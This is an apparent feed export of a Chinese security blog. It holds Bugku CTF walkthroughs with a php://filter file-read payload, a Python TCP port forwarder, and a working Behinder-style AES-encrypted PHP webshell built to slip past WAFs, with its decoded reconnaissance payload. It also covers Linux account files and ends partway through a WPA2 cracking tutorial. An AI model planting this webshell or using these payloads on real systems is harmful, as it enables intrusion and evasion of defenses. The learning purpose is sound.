    <id>http://yoursite.com/2018/12/18/入门CTF/</id>
    <published>2018-12-18T01:52:49.000Z</published>
    <updated>2018-12-18T03:47:02.173Z</updated>
    
    <content type="html"><![CDATA[<p>头次尝试CTF20多题，有些脑洞和方法不会的，在这里记录一下，相信会越来越好。</p><p>网站是：</p><p><a href="https://ctf.bugku.com" target="_blank" rel="noopener">https://ctf.bugku.com</a></p><h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><p>听说把 flag.baidu.com 解析到123.206.87.240 就能拿到flag</p><p>方法：</p><p>直接在 <code>c:\windows\system32\drivers\etc\hosts</code>打开进行修改，在最后添加上我们需要的 </p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fyao09x3f5j30kp09yt8z.jpg" alt=""></p><p>然后游览器访问flag.baidu.com即可拿到flag</p><h1 id="变量一"><a href="#变量一" class="headerlink" title="变量一"></a>变量一</h1><p>源码：</p><pre><code>flag In the variable ! &lt;?php  error_reporting(0);include &quot;flag1.php&quot;;highlight_file(__file__);if(isset($_GET[&apos;args&apos;])){    $args = $_GET[&apos;args&apos;];    if(!preg_match(&quot;/^\w+$/&quot;,$args)){        die(&quot;args error!&quot;);    }    eval(&quot;var_dump($$args);&quot;);}?&gt;</code></pre><p>从代码可以看出，这应该是个eval处存在代码注入，$$args可能存在变量覆盖，但是没有想出来如何解决，上网查之。</p><p>PHP超全局变量：$GLOBALS—-引用全局作用域中可用的全部变量。用于在 PHP 脚本中的任意位置访问全局变量</p><p>PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。</p><p>构造URL：<a href="http://123.206.87.240:8004/index1.php?args=GLOBALS" target="_blank" rel="noopener">http://123.206.87.240:8004/index1.php?args=GLOBALS</a></p><p>打印出全部的全局变量，找到flag</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fyaokei3ihj30q90ab74o.jpg" alt=""></p><h1 id="WEB5"><a href="#WEB5" class="headerlink" title="WEB5"></a>WEB5</h1><p>JSPFUCK??????答案格式CTF{**}</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fyaoq3590aj308w04rt8j.jpg" alt=""></p><p>F12看到里面的div标签下有一大串非常长的东西。</p><p>把那一大长串放到google的console中，运行出结果得到flag。（别忘了大写）</p><h1 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h1><p>先入为主了，没往实战上想，实在惭愧，脑子转不过来= -。看了一下网上的解答，恍然大悟</p><p>先扫后台，扫出了shell.php</p><p>然后burp抓包爆破得到flag</p><p> <code>flag{hack_bug_ku035}</code></p><h1 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h1><p>查源码，无果，抓包，无果。</p><p>构造<a href="http://123.206.87.240:8005/post/index.php?file=index.php" target="_blank" rel="noopener">http://123.206.87.240:8005/post/index.php?file=index.php</a>无果。</p><p>知道这里应该有关文件包含，但是苦于无法利用。</p><p>上网查询得file传值为：<code>php://filter/read=convert.base64-encode/resource=index.php</code></p><p>然后base64解密得到的值就可以得到flag</p><p><strong><code>php://filter</code>协议有一下几个应用：</strong></p><ul><li><p>1、利用base64获得源码</p></li><li><p>2、通过读写编码实行绕过操作</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;头次尝试CTF20多题，有些脑洞和方法不会的，在这里记录一下，相信会越来越好。&lt;/p&gt;
&lt;p&gt;网站是：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ctf.bugku.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ctf.bug
      
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>rtcp.py</title>
    <link href="http://yoursite.com/2018/12/17/rtcp-py/"/>
    <id>http://yoursite.com/2018/12/17/rtcp-py/</id>
    <published>2018-12-17T12:15:04.000Z</published>
    <updated>2018-12-17T12:15:35.665Z</updated>
    
    <content type="html"><![CDATA[<pre><code>import socketimport sysimport threadingimport timestreams = [None, None]  # 存放需要进行数据转发的两个数据流（都是 SocketObj 对象）debug = 1  # 调试状态 0 or 1def _usage():    print(&apos;Usage: ./rtcp.py stream1 stream2\nstream: l:port  or c:host:port&apos;)def _get_another_stream(num):    &quot;&quot;&quot;    从streams获取另外一个流对象，如果当前为空，则等待    &quot;&quot;&quot;    if num == 0:        num = 1    elif num == 1:        num = 0    else:        raise NameError(&apos;error&apos;)    while True:        if streams[num] == &apos;quit&apos;:            print(&apos;can not connect to the target, quit now!&apos;)            sys.exit(1)        if streams[num] is not None:            return streams[num]        else:            time.sleep(1)def _xstream(num, s1, s2):    &quot;&quot;&quot;    交换两个流的数据    num为当前流编号,主要用于调试目的，区分两个回路状态用。    &quot;&quot;&quot;    try:        while True:            # 注意，recv 函数会阻塞，直到对端完全关闭（close 后还需要一定时间才能关闭，最快关闭方法是 shutdow）            buff = s1.recv(1024)            if debug &gt; 0:                print(&apos;%d recv&apos; % num)            if len(buff) == 0:  # 对端关闭连接，读不到数据                print(&apos;%d one closed&apos; % num)                break            s2.sendall(buff)            if debug &gt; 0:                print(&apos;%d sendall&apos; % num)    except:        print(&apos;%d one connect closed.&apos; % num)    try:        s1.shutdown(socket.SHUT_RDWR)        s1.close()    except:        pass    try:        s2.shutdown(socket.SHUT_RDWR)        s2.close()    except:        pass    streams[0] = None    streams[1] = None    print(&apos;%d CLOSED&apos; % num)def _server(port, num):    &quot;&quot;&quot;    处理服务情况，num 为流编号（第 0 号还是第 1 号）    &quot;&quot;&quot;    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)    # 绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。    srv.bind((&apos;0.0.0.0&apos;, port))    # 开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。    srv.listen(1)    while True:        # 被动接受TCP客户端连接,(阻塞式)等待连接的到来        conn, addr = srv.accept()        print(&apos;connected from: %s&apos; % str(addr))        streams[num] = conn  # 放入本端流对象        # 获取另一端流对象        s2 = _get_another_stream(num)        _xstream(num, conn, s2)def _connect(host, port, num):    &quot;&quot;&quot;处理连接，num 为流编号（第 0 号还是第 1 号）    @note: 如果连接不到远程，会 sleep 36s，最多尝试 200（即两小时）    &quot;&quot;&quot;    not_connet_time = 0    wait_time = 36    try_cnt = 199    while True:        if not_connet_time &gt; try_cnt:            streams[num] = &apos;quit&apos;            print(&apos;not connected&apos;)            return None        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        try:            conn.connect((host, port))        except Exception:            print(&apos;can not connect %s:%s!&apos; % (host, port))            not_connet_time += 1            time.sleep(wait_time)            continue        print(&apos;connected to %s:%i&apos; % (host, port))        streams[num] = conn  # 放入本端流对象        s2 = _get_another_stream(num)  # 获取另一端流对象        _xstream(num, conn, s2)def main():    # if len(sys.argv) != 3:    #     _usage()    #     sys.exit(1)    tlist = []  # 线程列表，最终存放两个线程对象    # targv = [sys.argv[1], sys.argv[2]]    targv = [&quot;l:4567&quot;, &quot;c:127.0.0.1:80&quot;]    for i in [0, 1]:        s = targv[i]  # stream 描述 c:ip:port 或 l:port        sl = s.split(&apos;:&apos;)        if len(sl) == 2 and (sl[0] == &apos;l&apos; or sl[0] == &apos;L&apos;):  # l:port            t = threading.Thread(target=_server, args=(int(sl[1]), i))            tlist.append(t)        elif len(sl) == 3 and (sl[0] == &apos;c&apos; or sl[0] == &apos;C&apos;):  # c:host:port            t = threading.Thread(target=_connect, args=(sl[1], int(sl[2]), i))            tlist.append(t)        else:            _usage()            sys.exit(1)    for t in tlist:        t.start()    for t in tlist:        t.join()    sys.exit(0)if __name__ == &apos;__main__&apos;:    main()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;import socket
import sys
import threading
import time
streams = [None, None]  # 存放需要进行数据转发的两个数据流（都是 SocketObj 对象）
debug = 1  # 调试
      
    
    </summary>
    
      <category term="python脚本" scheme="http://yoursite.com/categories/python%E8%84%9A%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>动态二进制加密实现一句话木马（冰蝎）</title>
    <link href="http://yoursite.com/2018/12/17/%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%AF%86%E5%AE%9E%E7%8E%B0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%88%E5%86%B0%E8%9D%8E%EF%BC%89/"/>
    <id>http://yoursite.com/2018/12/17/动态二进制加密实现一句话木马（冰蝎）/</id>
    <published>2018-12-17T03:19:44.000Z</published>
    <updated>2018-12-17T07:43:42.476Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一句话木马从最早的<code>&lt;?php @eval($_POST[cmd]);?&gt;</code>到现在，也有很长时间的历史了。客户端工具也从最简单的一个html页面发展到现在的各种GUI工具。但是近些年友军也没闲着，涌现出了各种防护系统，这些防护系统主要分为两类：一类是基于主机的，如Host based IDS、安全狗、D盾等，基于主机的防护系统主要是通过对服务器上的文件进行特征码检测；另一类是基于网络流量的，如各种云WAF、各种商业级硬件WAF、网络防火墙、Net Based IDS等，基于网络的防护设备其检测原理是对传输的流量数据进行特征检测，目前绝大多数商业级的防护设备皆属于此种类型。一旦目标网络部署了基于网络的防护设备，我们常用的一句话木马客户端在向服务器发送Payload时就会被拦截，这也就导致了有些场景下会出现一句话虽然已经成功上传，但是却无法连接的情况。</p><h1 id="为什么被拦截"><a href="#为什么被拦截" class="headerlink" title="为什么被拦截"></a>为什么被拦截</h1><p>虽然有时候会采用base64编码，但是payload任有特征字符如eval等，参数值有base64编码等等。<br>对方的规则也在不断的更新，不断识别关键的编码函数名称、加解密函数名称，并加入到规则里面。于是攻击者和防御者展开了长期的较量，不停的变换着各种姿势。</p><h1 id="为啥防御者可以不停的更新规则"><a href="#为啥防御者可以不停的更新规则" class="headerlink" title="为啥防御者可以不停的更新规则"></a>为啥防御者可以不停的更新规则</h1><p>主要有两个原因：</p><ul><li><p>攻击者发送的请求都是脚本源代码，无论怎么样编码，仍然是服务器端解析引擎可以解析的源代码，是基于文本的，防御者能看懂。</p></li><li><p>攻击者执行多次相同的操作，发送的请求数据也是相同的，防御者就可以把他看懂的请求找出特征固化为规则。</p></li></ul><p>但是如果攻击者的请求不是文本格式的源代码而是编译之后的的字节码，字节码是一堆二进制数据流，不存在参数，攻击者把二进制字节码进行加密，防御者看到的就是一堆加了密的二进制数据流，攻击者多次执行同样的操作采用不同的密钥加密，即使是同样的payload，防御者看到的请求数据也不一样，这就使防御者无法通过流量分析来提取规则。</p><h1 id="一劳永逸的绕过"><a href="#一劳永逸的绕过" class="headerlink" title="一劳永逸的绕过"></a>一劳永逸的绕过</h1><h2 id="具体流程："><a href="#具体流程：" class="headerlink" title="具体流程："></a>具体流程：</h2><ul><li>首次连接一句话服务端时，客户端首先向服务器端发起一个GET请求，服务器端随机产生一个128位的密钥，把密钥回显给客户端，同时把密钥写进服务器的Session中。</li><li>客户端获取密钥后，对本地的二进制payload先进行AES加密，再通过POST方式发送至服务器端。</li><li>服务器收到数据后，从Session中取出秘钥，进行AES解密，解密之后得到二进制payload数据。</li><li>服务器解析二进制payload文件，执行任意代码，并将执行结果加密返回。</li><li>客户端解密服务器端返回的结果。</li></ul><h2 id="执行流程图："><a href="#执行流程图：" class="headerlink" title="执行流程图："></a>执行流程图：</h2><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fy9ksdk3ufj30f60ejdgl.jpg" alt=""></p><h1 id="服务端实现"><a href="#服务端实现" class="headerlink" title="服务端实现"></a>服务端实现</h1><p>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p><p>代码：</p><pre><code>&lt;?phpsession_start();if (isset($_GET[&apos;pass&apos;])){    #uniqid()基于以微秒计的当前时间，生成一个唯一的 ID。    $key=substr(md5(uniqid(rand())),16);    $_SESSION[&apos;k&apos;]=$key;    print $key;}else{    $key=$_SESSION[&apos;k&apos;];    #参数为解密密文、解密方法、解密密钥    #php://input 去获取请求体中的信息（请求类型为multipart/form-data 时 失效不会封装 数据为空）封装起来返回给程序 无法获取get信息 因为GET的信息附加到URL里 不在请求体中    $decrptContent=openssl_decrypt(file_get_contents(&quot;php://input&quot;), &quot;AES128&quot;, $key);    $arr=explode(&apos;|&apos;,$decrptContent);    $func=$arr[0];    $params=$arr[1];    $func($params);}?&gt;</code></pre><p>流程：</p><ul><li>首先客户端以Get形式发起带密码的握手请求，服务端产生随机密钥并写入Session。</li><li>客户端将源代码，如<code>assert|eval(&quot;phpinfo();”)</code>利用AES加密，发送至服务端，服务端收到之后先进行AES解密，得到中间结果字符串<code>assert|eval(&quot;phpinfo();&quot;)。</code></li><li>服务端利用explode函数将拆分为一个字符串数据，索引为0的元素为字符串assert，索引为1的元素为字符串<code>eval(&quot;phpinfo();&quot;)</code>。</li><li>以可变函数方式调用索引为0的数组元素，参数为索引为1的数组元素，即为<code>assert(&quot;eval(\&quot;phpinfo;\&quot;)&quot;)</code> 。</li></ul><p>再具体一点，比如客户端有一段代码</p><pre><code>assert|eval(&quot;phpinfo();&quot;)</code></pre><p>进行AES128加密发送给服务端，服务端用explode函数分割字符，索引为0的是assert，索引为1的<code>eval(&quot;phpinfo();&quot;)</code>，然后通过可变函数执行<code>assert(&quot;eval(\&quot;phpinfo();\&quot;)&quot;)</code>。</p><h1 id="客户端实现"><a href="#客户端实现" class="headerlink" title="客户端实现"></a>客户端实现</h1><p>通过作者提供的客户端，拿到：</p><pre><code>assert|eval(base64_decode(&apos;ZXJyb3JfcmVwb3J0aW5nKDApOw0KZnVuY3Rpb24gbWFpbigpIHsNCiAgICBvYl9zdGFydCgpOyBwaHBpbmZvKCk7ICRpbmZvID0gb2JfZ2V0X2NvbnRlbnRzKCk7IG9iX2VuZF9jbGVhbigpOw0KICAgICRkcml2ZUxpc3QgPSIiOw0KICAgIGlmIChzdHJpc3RyKFBIUF9PUywid2luZG93cyIpfHxzdHJpc3RyKFBIUF9PUywid2lubnQiKSkNCiAgICB7DQogICAgICAgIGZvcigkaT02NTskaTw9OTA7JGkrKykNCiAgICAJew0KICAgIAkJJGRyaXZlPWNocigkaSkuJzovJzsNCiAgICAJCWZpbGVfZXhpc3RzKCRkcml2ZSkgPyAkZHJpdmVMaXN0PSRkcml2ZUxpc3QuJGRyaXZlLiI7IjonJzsNCiAgICAJfQ0KICAgIH0NCgllbHNlDQoJew0KCQkkZHJpdmVMaXN0PSIvIjsNCgl9DQogICAgJGN1cnJlbnRQYXRoPWdldGN3ZCgpOw0KICAgIC8vZWNobyAicGhwaW5mbz0iLiRpbmZvLiJcbiIuImN1cnJlbnRQYXRoPSIuJGN1cnJlbnRQYXRoLiJcbiIuImRyaXZlTGlzdD0iLiRkcml2ZUxpc3Q7DQogICAgJG9zSW5mbz1QSFBfT1M7DQogICAgJHJlc3VsdD1hcnJheSgiYmFzaWNJbmZvIj0+YmFzZTY0X2VuY29kZSgkaW5mbyksImRyaXZlTGlzdCI9PmJhc2U2NF9lbmNvZGUoJGRyaXZlTGlzdCksImN1cnJlbnRQYXRoIj0+YmFzZTY0X2VuY29kZSgkY3VycmVudFBhdGgpLCJvc0luZm8iPT5iYXNlNjRfZW5jb2RlKCRvc0luZm8pKTsNCiAgICAvL2VjaG8ganNvbl9lbmNvZGUoJHJlc3VsdCk7DQogICAgc2Vzc2lvbl9zdGFydCgpOw0KICAgICRrZXk9JF9TRVNTSU9OWydrJ107DQogICAgLy9lY2hvIGpzb25fZW5jb2RlKCRyZXN1bHQpOw0KICAgIGVjaG8gb3BlbnNzbF9lbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCAiQUVTMTI4IiwgJGtleSk7DQp9DQptYWluKCk7&apos;));</code></pre><p>经过base64解码得：</p><pre><code>error_reporting(0);function main() {    ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();    $driveList =&quot;&quot;;    if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;))    {        for($i=65;$i&lt;=90;$i++)        {            $drive=chr($i).&apos;:/&apos;;            file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&apos;&apos;;        }    }    else    {        $driveList=&quot;/&quot;;    }    $currentPath=getcwd();    //echo &quot;phpinfo=&quot;.$info.&quot;\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\n&quot;.&quot;driveList=&quot;.$driveList;    $osInfo=PHP_OS;    $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo));    //echo json_encode($result);    session_start();    $key=$_SESSION[&apos;k&apos;];    //echo json_encode($result);    echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key);}main();</code></pre><p>可以看出这段代码主要做了这些工作：</p><p>保存phpinfo内容</p><pre><code>ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();</code></pre><blockquote><p><code>ob_start()</code>把输出内容输出到缓冲区而不是游览器，然后用<code>ob_get_contents</code>得到缓冲区数据，最后用<code>ob_end_clean</code>清除缓冲区</p></blockquote><p>服务端有哪些盘符</p><pre><code>$driveList =&quot;&quot;;   if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;))   {       for($i=65;$i&lt;=90;$i++)       {           $drive=chr($i).&apos;:/&apos;;           file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&apos;&apos;;       }   }   else   {       $driveList=&quot;/&quot;;   }</code></pre><p>获取当前路径</p><pre><code>$currentPath=getcwd();</code></pre><p>以及检查php运行环境。</p><pre><code>$osInfo=PHP_OS;</code></pre><p>然后对这些信息进行base64编码，再用json编码，再用key进行”AES128”加密。</p><pre><code>$result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo));//echo json_encode($result);session_start();$key=$_SESSION[&apos;k&apos;];//echo json_encode($result);echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key);</code></pre><p>借鉴自：<a href="http://halazi.xin/2018/12/11/Behinder/" target="_blank" rel="noopener">http://halazi.xin/2018/12/11/Behinder/</a></p><p><a href="https://xz.aliyun.com/t/2744" target="_blank" rel="noopener">https://xz.aliyun.com/t/2744</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一句话木马从最早的&lt;code&gt;&amp;lt;?php @eval($_POST[cmd]);?&amp;gt;&lt;/code&gt;到现在，也有很长时间的历史了。
      
    
    </summary>
    
      <category term="加密解密" scheme="http://yoursite.com/categories/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux账户安全机制</title>
    <link href="http://yoursite.com/2018/12/13/Linux%E8%B4%A6%E6%88%B7%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    <id>http://yoursite.com/2018/12/13/Linux账户安全机制/</id>
    <published>2018-12-13T02:43:18.000Z</published>
    <updated>2018-12-13T03:01:14.327Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux系统标识与鉴别-安全主体"><a href="#Linux系统标识与鉴别-安全主体" class="headerlink" title="Linux系统标识与鉴别-安全主体"></a>Linux系统标识与鉴别-安全主体</h1><h2 id="安全主体"><a href="#安全主体" class="headerlink" title="安全主体"></a>安全主体</h2><ul><li>用户：身份标识（UserID）</li><li>组：身份标识（Group ID）</li></ul><h2 id="用户与组基本概念"><a href="#用户与组基本概念" class="headerlink" title="用户与组基本概念"></a>用户与组基本概念</h2><ul><li>文件必须有所有者</li><li>用户必须属于某个或多个组</li><li>用户与组的关系灵活（一对多、多对多等都可以）</li><li>根用户拥有所有权限</li></ul><h1 id="Linux系统标识与鉴别-帐号信息存储"><a href="#Linux系统标识与鉴别-帐号信息存储" class="headerlink" title="Linux系统标识与鉴别-帐号信息存储"></a>Linux系统标识与鉴别-帐号信息存储</h1><h2 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h2><h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><pre><code>/etc/passwd/etc/shadow</code></pre><h3 id="组信息"><a href="#组信息" class="headerlink" title="组信息"></a>组信息</h3><pre><code>/etc/group/etc/gshadow</code></pre><p>在Linux中系统中，并不认识<strong>帐号名称</strong>，认识的是<strong>帐号ID</strong>，帐号ID保存在<code>/etc/passwd</code>文件中</p><p>在登录Linux主机时，在输入完帐号和密码时，Linux会先查找<code>/etc/passwd</code>文件中是否有这个帐号，如果没有则跳出，如果有的话，他会读取该帐号的user ID和group ID同时该帐号的根目录和shell也读了出来</p><h3 id="etc-passwd中的信息"><a href="#etc-passwd中的信息" class="headerlink" title="/etc/passwd中的信息"></a><code>/etc/passwd</code>中的信息</h3><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fy4xpgsw5dj30fq08mjxj.jpg" alt=""></p><p>一共有七项，每一项使用：分开，他们代表的意思如下：</p><p>（1）帐号名称：帐号名称由于对应用户ID，这个是系统默认用户root超级管理员，在同一个系统帐号名称是唯一的。</p><p>（2）密码：由于系统中/etc/shadow文件用于存放加密后的口令，所以在这里这一项是“x”来表示，如果用户没有设置口令，则该项为空。</p><p>（3）用户lD：不同的用户识别码不同，其中用户ID有以下几种：<br>0代表系统管理员（如果建立一个系统管理员，可以建立一个普通帐户，然后将该账户的用户1D改为0即可）。<br>1-500系统预留的1D，500以上是普通用户使用。</p><p>（4）组ID：用来规范群组，他与<code>/etc/group</code>有关。</p><p>（5）描述信息：这个字段几乎没有什么作用，只是用来解释这个帐号的意义。</p><p>（6）用户根目录：就是用户登录系统的起始目录，用户登录系统后将首先进入该目录。root用户默认的是<code>/root</code>，普通用户的是<code>/home</code>/用户名。</p><p>（7）用户登录shell：就是用户登录系统时使用的shell。</p><h3 id="etc-shadow中的信息"><a href="#etc-shadow中的信息" class="headerlink" title="/etc/shadow中的信息"></a><code>/etc/shadow</code>中的信息</h3><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fy4xpvryghj30ka0aq10y.jpg" alt=""></p><ul><li>由于passwd文件对于系统中的所有用户是可读的，口令比较容易破解，存在较大的安全隐患。</li><li>使用“shadow”文件保存密文的用户口令，“shadow”文件只有管理员用户才可以读取其中的内容。</li></ul><p><strong>登录名：加密口令：最后一次修改时间：最小时间间隔：最大时间间隔：警告时间：不活动时间：失效时间：标志</strong></p><p>（1）帐户名称：和passwd对应，和passwd的意思相同。</p><p>（2）密码：已经加密过的真正的密码，只能看到一些特殊符号。<br><strong>如第一个字符为<code>“*”</code>表示此用户不用来登录，如不想让某账户登录可在前面加个星。</strong></p><ul><li>$1$表明是用MD5加密的</li><li>$2$是用Blowfish加密的</li><li>$5$是用SHA-256加密的</li><li>$6$开头的，表明是用SHA-512加密的，</li></ul><p>（3）上次改动密码的日期：这段记录了改动密码的最后日期。因为Linux计算日期的方法是以1970年1月1日作为1，1971年1月1日就是366，依次类推</p><p>（4）密码不可被改动的天数：必须在这个时间内重新修改密码，否则这个帐号将暂时失效。上面的99999，表示密码不需要重新输入</p><p>（5）密码变更期期限快到前的警告期：当帐号的密码失效期限快到时，系统依据这个字段的设定发出警告，提醒用户：再过n天您的密码将过期，请尽快重新设定密码。默认的是七天。</p><p>（6）帐号失效期</p><p>（7）帐号取消日期</p><p>（8）保留：最后一个字段是保留的，看以后有没有新功能加入。</p><h3 id="etc-group中的信息"><a href="#etc-group中的信息" class="headerlink" title="/etc/group中的信息"></a><code>/etc/group</code>中的信息</h3><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fy4xq811c0j309l0ad77k.jpg" alt=""></p><p>（1）群组名称：就是群组的名称了。</p><p>（2）群组密码：通常不需设定，很少使用群组登录。密码被记录在<code>/etc/gshadow</code>中。</p><p>（3）群组ID：也就是组ID了。</p><p>（4）支持帐号的名称：这个群组的所有帐号</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Linux系统标识与鉴别-安全主体&quot;&gt;&lt;a href=&quot;#Linux系统标识与鉴别-安全主体&quot; class=&quot;headerlink&quot; title=&quot;Linux系统标识与鉴别-安全主体&quot;&gt;&lt;/a&gt;Linux系统标识与鉴别-安全主体&lt;/h1&gt;&lt;h2 id=&quot;安全主体&quot;
      
    
    </summary>
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>利用airodump-ng和aircrack-ng进行无线破解</title>
    <link href="http://yoursite.com/2018/12/12/%E5%88%A9%E7%94%A8airodump-ng%E5%92%8Caircrack-ng%E8%BF%9B%E8%A1%8C%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3/"/>
    <id>http://yoursite.com/2018/12/12/利用airodump-ng和aircrack-ng进行无线破解/</id>
    <published>2018-12-12T09:12:56.000Z</published>
    <updated>2018-12-12T12:15:27.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEP（有线等效保密）认证过程："><a href="#WEP（有线等效保密）认证过程：" class="headerlink" title="WEP（有线等效保密）认证过程："></a>WEP（有线等效保密）认证过程：</h1><ul><li>客户端向接入点发送认证请求</li><li>接入点发回一段明文</li><li>客户端利用事先共享的密钥加密这段明文（对称），并再次发出认证请求</li><li>接入点对数据包进行解密，比较明文，来决定是否接受请求</li></ul><h1 id="WEP2（wifi网络安全接入）安全性："><a href="#WEP2（wifi网络安全接入）安全性：" class="headerlink" title="WEP2（wifi网络安全接入）安全性："></a>WEP2（wifi网络安全接入）安全性：</h1><ul><li>WPA2在密钥足够强的情况下是安全的，过短的密钥仍可能被爆破解出</li><li>WPA2-PSK指的是WPA2个人版，指的是使用事先约定的密钥进行认证的WPA2</li></ul><h1 id="Aircrack-ng抓包及破解WPA2"><a href="#Aircrack-ng抓包及破解WPA2" class="headerlink" title="Aircrack-ng抓包及破解WPA2"></a>Aircrack-ng抓包及破解WPA2</h1><ul><li>虚拟机安装无线网卡</li><li>配置无线网卡</li><li>利用airodump-ng进行抓包</li><li>利用crunch生成字典</li><li>利用aircrack-ng进行爆破</li></ul><p><strong>Aircrack</strong>是破解<code>WEP/WPA/WPA2</code>加密的主流工具之一。<strong>Aircrack-ng</strong>套件包含的工具可用于捕获数据包、握手验证。可用来进行暴力破解和字典攻击。</p><p><strong>Aircrack-ng</strong> 攻击 主要是拿到握手包，用字典破解握手包。</p><p>首先，你得有个无线网卡，然后去自动配置他，操作嘛当然都是在kali虚拟机下进行的。</p><h2 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h2><pre><code>airmon-ng check kill</code></pre><p>kill掉影响网卡的进程，一般情况下，每次重启或者开机后这些进程都会自己开始。</p><p><img src="https://img-blog.csdnimg.cn/20181109163042314.png" alt=""></p><p>将无线网卡模式改为<strong>monitor</strong>模式</p><pre><code>iwconfig wlan0mon mode monitor </code></pre><p><img src="https://img-blog.csdnimg.cn/20181109164030848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>打开网卡：</p><pre><code>airmon-ng start wlan0</code></pre><p><img src="https://img-blog.csdnimg.cn/20181109164205722.png" alt=""></p><p>这时候网卡名为wlan0mon。（mon是monitor的缩写，意思为监控）</p><h2 id="wifi嗅探"><a href="#wifi嗅探" class="headerlink" title="wifi嗅探"></a>wifi嗅探</h2><p>查看当前区域的所有wifi</p><pre><code>airodump-ng wlan0mon</code></pre><p><img src="https://img-blog.csdnimg.cn/2018110916441831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><ul><li>BSSID：wifi路由的 Mac地址， </li><li>Data 当前wifi数据大小，有数据就表明有人正在使用，你就可以把它作为一个选择了。</li><li>CH ：渠道，后面的攻击要用到。 </li><li>ESSID： wifi的 名字。还有，他的排序是按信号的强弱来排序的，越往上信号越强。PWR 是强度，不用记，慢慢的就知道了。</li></ul><p>经过观察之后选择一个你想破解或者攻击的wifi，前提是它得有数据显示，Date的那列，所以选择攻击的wifi最好先从Date看起来，选择一个有数据的wifi之后按Ctrl+c 停止检测，复制你选择的Mac地址。</p><h2 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h2><pre><code>airodump-ng --bssid 0C:4B:54:AE:C1:06 -c 11 -w ~/wlan0/qihua wlan0mon</code></pre><blockquote><p>-c 是 渠道  bssid 是路由的Mac地址 -w是放包的目录</p></blockquote><p><img 